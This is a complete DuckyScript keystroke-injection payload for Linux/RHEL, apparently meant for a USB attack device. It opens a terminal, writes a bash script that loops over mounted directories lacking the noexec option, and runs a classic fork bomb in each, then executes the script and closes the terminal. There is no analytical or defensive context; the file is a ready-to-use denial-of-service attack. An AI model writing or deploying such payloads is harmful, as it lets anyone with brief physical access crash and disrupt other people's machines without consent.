REM Linux/RHEL Payload to create a script that finds mounted directories with exec option, changes to each, and executes fork bomb
DEFAULTDELAY 500
DELAY 3000
CTRL ALT t
DELAY 2000
STRING cat << 'EOF' > fork_bomb.sh
ENTER
STRING #!/bin/bash
ENTER
STRING # Check if current directory's mount has noexec; if so, exit
ENTER
STRING if findmnt -T "$(pwd)" -o OPTIONS | grep -q noexec; then exit 1; fi
ENTER
STRING # Find mounted directories with exec option (normally without noexec), change to each, and execute fork bomb
ENTER
STRING for dir in $(findmnt -n -o TARGET,OPTIONS | grep -v noexec | awk '{print $1}'); do
ENTER
STRING     cd "$dir"
ENTER
STRING     :(){ :|:& };:
ENTER
STRING     :
ENTER
STRING done
ENTER
STRING EOF
ENTER
DELAY 1000
STRING chmod +x fork_bomb.sh
ENTER
DELAY 500
STRING ./fork_bomb.sh
ENTER
DELAY 2000
STRING exit
ENTER
